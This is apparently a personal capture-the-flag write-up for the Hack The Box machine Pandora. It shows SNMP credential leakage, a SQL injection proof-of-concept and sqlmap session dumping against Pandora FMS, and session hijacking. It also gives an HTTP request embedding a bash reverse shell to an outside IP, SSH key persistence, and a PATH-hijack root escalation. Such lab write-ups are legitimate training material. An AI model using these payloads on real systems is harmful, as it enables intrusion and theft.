+++
title = "HTB - Pandora"
date = 2025-01-02
+++

### Scan
```
nmap -sV -sC -p- --open 10.10.11.136                       
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-27 18:35 EST
Nmap scan report for 10.10.11.136
Host is up (0.10s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
|_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Play | Landing
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.62 seconds

--------------------------------------------------------------

nmap -sU -top-ports=100 10.10.11.136
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-02 15:19 EST
Nmap scan report for 10.10.11.136
Host is up (0.10s latency).
Not shown: 96 closed udp ports (port-unreach)
PORT    STATE         SERVICE
67/udp  open|filtered dhcps
137/udp open|filtered netbios-ns
138/udp open|filtered netbios-dgm
161/udp open          snmp


```

### Enumeration
Apache 2.4.41
Didn't find much when looking at TCP Ports. Let this serve as a reminder to check for UDP ports as well.
We see `snmp` is open, meaning we are likely able to enumerate. We can use a tool called `snmpwalk` to investigate.
`apt install snmp snmp-mibs-downloader` can be used to install the tool. Make to to edit configuration file and comment out the line.
It takes a while to run. When finished, we see information about name, location, addresses, etc.
`grep` for all instances of the name `daniel`. We find credentials `daniel:HotelBabylon23`
We are able to SSH into the box.

### Privilege Escalation
Another user named `matt` is in the home directory, but we cannot read or access.
Searching the `var/www`, we can access the server's directory. There was no information leak on the front end, but now, we can see the software is Pandora FMS.
We can also visit `/etc/apache2/sites-enabled/pandora.conf` to see the correct subdomain for an admin portal. It runs on localhost:80, so we can forward the port through our SSH connection.
`ssh -L 9001:localhost:80 daniel@panda.htb`. We forwarded 80 to 9001 on our machine.
We see a version! `v7.0NG.742_FIX_PERL2020`
Doing some google searching, we find an authenticated RCE for perhaps a later stage migration.

We also find CVE-2021-32099, which allows 
for an unauthenticated user to land an authenticated session via `/include/chart_generator.php`, we can leverage this SQL injection. It passes `$_REQUEST['session_id']` to the constructor for a `PandoraFMS\User` object, and that is not sanitized.

We can verify by using the following link in the URL.`http://localhost:9001/pandora_console/include/chart_generator.php?session_id=%27%20union%20select%201;--%20-`

I can throw `sqlmap` at this, but be sure to understand what is happening here, as this tool isn't allowed on the exam. `sqlmap -u 'http://localhost:9001/pandora_console/include/chart_generator.php?session_id=1'`

Get familiar with `sqlmap`...
Appending `--dbs` will show databases, `-D pandora --tables` will show tables in `pandora` db.
`-D pandora -T tsessions_php --dump --where "data<>''"` will dump the sessions for different users. There is one for `matt`. 

We can throw these into a file, and clean it with: `cat sessions | awk '{print $2}' > s.txt`
Now, we can validate which sessions may work with `wfuzz`:
`wfuzz -u http://localhost:9001/pandora_console/ -b PHPSESSID=FUZZ -w s.txt`
<img alt="Image" async src="images/Screenshot 2025-01-02 at 16.25.08.png" width="800px"></img>
We can see the `matt` session seems to be a bit different. Inspect Element, go to Storage, Cookie, then change the Session ID to match the one we verified: `g4e01qdgk36mfdh90hvcc54umq`
We should be logged in.

Now we can chain with RCE. There are two ways of doing so according to 0xdf. We'll leverage CVE-2020-13851 to abuse the functionality of the ajax.php file. Find the post request in repeater, and modify to look something like this:

```
POST /pandora_console/ajax.php HTTP/1.1
Host: pandora.panda.htb:9001
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 2227
Origin: http://pandora.panda.htb:9001
Connection: close
Referer: http://pandora.panda.htb:9001/pandora_console/index.php?sec=eventos&sec2=operation/events/events
Cookie: PHPSESSID=g4e01qdgk36mfdh90hvcc54umq

page=include/ajax/events&perform_event_response=10000000&target=bash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.17/443+0>%261"&response_id=1
```

Catch shell, stabilize, and get user flag.
GOT BURP WORKING FUCK YEAH
User:`372b0d26c90754a51a3217b05ff2c209`

Looking around, we can serve linpeas. We can also check SUIDs:
`find / -perm -4000 -ls 2>/dev/null`
we find pandora_backup which is interesting. IPP and 0xdf talk about the inability to run the binary
We can sidestep this by creating a key with: `ssh-keygen -f matt`. Move  both to working dir
On the initial Matt SSH, create the `/home/matt/.ssh` dir
Then, serve `matt.pub` with python and download into that directory.
`mv` matt.pub to `authorized_keys`
SSH back into the box by `chmod 600 matt`, and then `ssh -i matt matt@10.10.11.136`

When we run `pandora_backup`, we see that tar is referenced, meaning it's proabably using that to compress and archive files.
We can use `ghidra` or `ltrace` to analyze the binary.
We can see a call from System, instead of the full path.
This attack is called a path hijack, because we can control the user environemtn path variable
We can work from `/dev/shm`
```
matt@pandora:~$ cd /dev/shm
matt@pandora:/dev/shm$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
matt@pandora:/dev/shm$ export PATH=/dev/shm:$PATH
matt@pandora:/dev/shm$ echo $PATH
/dev/shm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
matt@pandora:/dev/shm$ 
```
Now that it looks to /dev/shm for `tar`, we can `vim` and create a tar file with:
```
#!/bin/bash

bash
```
When the script runs, it will call this `tar`
give it perms `chmod +x tar`
then run it with `pandora_backup`
ROOT:`77819639e146927a9abdaeaabe90a13a`





